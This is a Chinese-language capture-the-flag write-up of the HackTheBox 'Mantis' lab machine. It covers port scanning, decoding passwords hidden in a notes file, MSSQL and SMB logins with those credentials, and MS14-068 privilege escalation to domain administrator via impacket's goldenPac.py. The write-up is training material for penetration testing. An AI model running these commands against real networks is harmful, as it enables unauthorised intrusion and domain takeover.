---
title: "HTB Mantis"
description: "HackTheBox篇Active Directory 101系列之Mantis"

date: 2024-07-18T15:11:31+08:00
lastmod: 2025-11-11T10:06:26+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - MS14-068
---
<!--more-->

> 靶机ip：10.10.10.52

# 知识点

* MS14-068权限提升

# 信息收集

## nmap扫描

`nmap -sS -sV -sC -p- 10.10.10.52`

```txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 21:03 CST
Nmap scan report for 10.10.10.52
Host is up (0.41s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-18 13:03:51Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.10.52:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
|_ssl-date: 2024-07-18T13:05:06+00:00; -3s from scanner time.
| ms-sql-info:
|   10.10.10.52:1433:
|     Version:
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-18T13:00:53
|_Not valid after:  2054-07-18T13:00:53
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft IIS httpd 7.5
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Tossed Salad - Blog
|_http-server-header: Microsoft-IIS/7.5
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
49176/tcp open  msrpc        Microsoft Windows RPC
49182/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.10.52:50255:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ms-sql-info:
|   10.10.10.52:50255:
|     Version:
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-18T13:00:53
|_Not valid after:  2054-07-18T13:00:53
|_ssl-date: 2024-07-18T13:05:06+00:00; -3s from scanner time.
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 34m15s, deviation: 1h30m45s, median: -3s
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-07-18T13:04:48
|_  start_date: 2024-07-18T13:00:29
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2024-07-18T09:04:52-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.51 seconds
```

有`DNS`服务、`Kerberos`服务、`ldap`服务、`SMB`服务、在`1337`端口有`http`服务、在`1433` 端口上有`SQL Server`服务，域名为`mantis.htb.local`，`8080`端口上还有`http`服务，应该是个`Blog`，还有其他等多个端口。

## ldap

 `ldapsearch -x -H ldap://10.10.10.52:389 -s base -b "" namingcontexts`

![image-20240718154737592](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240718154746434-704756932.png)

没什么重要的信息

## SMB

`smbclient -L //10.10.10.52`

![image-20240718154840864](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240718154849413-1830849376.png)

`smb`同样没有什么重要信息

## rpc

利用RPC远程过程调用枚举用户

![image-20240718212246343](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240718212255182-877972644.png)

允许匿名访问，但不允许执行命令。

## 1337端口

此端口有`http`服务，访问一下

![image-20240718212334561](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240718212343495-1754620610.png)

是个正常的`IIS`服务，当前页面没啥信息，利用`gobuster`工具扫描一下

`gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40`

![image-20240719105840793](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719105859519-1199674944.png)

发现有个`/secure_notes`目录，访问一下

![image-20240719105916031](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719105933756-1435935472.png)

发现有两个文件

* `web_config`

![image-20240719105944860](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719105955413-1263203338.png)

这个没什么用，重点看第一个文件

* `dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`

![image-20240719110021015](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719110031571-1931928202.png)

看起来像是安装`cms`的操作步骤，如下载 SQL server 数据库、创建对应数据库和管理员等

![image-20240719110124666](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719110135329-2021603843.png)

在最下面找到一串二进制文件，疑似`admin`密码，利用工具尝试解密

![image-20240719110618385](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719110629100-105995333.png)

拿到密码`@dm!n_P@ssW0rd!`

也可以利用`shell`命令解码

`echo "010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001" | perl -lpe '$_=pack"B*",$_'`

![image-20240719111148937](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719111202945-1455444381.png)

这是会发现文件名像是某种编码，也拿工具尝试一下

![image-20240719110835720](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719110846704-1509776820.png)

成功拿到貌似是数据库的密码`m$$ql_S@_P@ssW0rd!`

也可以利用`shell`命令解码

` echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p`

![image-20240719111251279](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719111302001-1732461918.png)

这样我们就拿到了两个密码

## 1433端口

这个端口运行着`SQL Server`服务，上面已经拿到密码，尝试登陆

先尝试使用默认数据库管理员`sa`进行登录数据库

`python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'sa:m$$ql_S@_P@ssW0rd!@10.10.10.52'`

![image-20240719112859624](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719112910589-1427023602.png)

登陆失败，感觉是用户名不对，使用 `OrchardCMS` 的管理员 `admin` 作为用户名登陆

`python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'`

![image-20240719113037299](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719113048163-1389822070.png)

登陆成功，接下来对数据库进行信息搜集，为了方便，使用`GUI`工具`DBeaver`进行连接

![image-20240719113555918](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719113606800-1496602545.png)

![image-20240719113623175](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719113633820-92554602.png)

![image-20240719113845434](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719113856364-1854941201.png)

填好相关信息，下载好驱动就可以测试连接了

![image-20240719113923598](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719113934286-81611401.png)

连接成功！接下来就可以查找用户信息

![image-20240719114605389](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719114616076-1096852668.png)

最终在`orcharddb`数据库中的`blog_Orchard_Users_UserPartRecord`表中找到一个`James`用户的用户名和密码

`james : J@m3s_P@ssW0rd!`

## 8080端口

这个端口有`http`服务，看样子是个`Blog`，先简单指纹识别一下

![image-20240718155158028](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240718155206460-467081700.png)

发现`Orchard Core CMS`

尝试搜索该CMS的历史漏洞，但是貌似没有什么能getshell的漏洞

![image-20240719141406528](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240719141417773-1235008164.png)

# James 渗透

有了用户`James`的密码`J@m3s_P@ssW0rd!`接可以再次测试一些服务

## SMB

利用`crackmapexec`尝试登录`SMB`服务

`crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'`

![image-20240722093527746](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722093550555-1508748961.png)

尝试利用`smbmap`连接查看`SMB`服务

`smbmap -H 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'`

![image-20240722094104907](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722094127633-77556185.png)

发现当前用户对目录`SYSVOL`、`NETLOGON`拥有只读权限

## rpc

`rpcclient -U james 10.10.10.52 --password='J@m3s_P@ssW0rd!'`

`enumdomusers`

![image-20240722094316905](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722094339148-278161430.png)

找到以上用户，但是没什么用



## Kerberoasting

尝试进行一下`Kerberoasting`

![image-20240722094731016](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722094800302-383462311.png)

仍然没有有用的信息

# MS14-068权限提升

> ms14-068 漏洞产生的原因是普通用户向 kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么返回给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送给KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。而该漏洞的利用条件也非常简单，只需要拥有任意域用户的用户名、SID、密码即可获取域管理员权限。
>
> [参考链接](https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html)

先修改本地 hosts 文件完成域名解析

```sh
vim /etc/hosts
# 配置
10.10.10.52 mantis.htb.local mantis
10.10.10.52 htb.local
```

使用 `impacket` 工具包中的`goldenPac.py`可获取目标的系统权限

```sh
python3 goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
```

![image-20240722105534389](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722105556807-977799087.png)

成功拿到管理员权限

![image-20240722105644503](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722105706614-1389153774.png)

![image-20240722105809518](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722105833170-745399915.png)

最后也是在`james`和`Administrator`的`Desktop`找到`user.txt`和`root.txt`

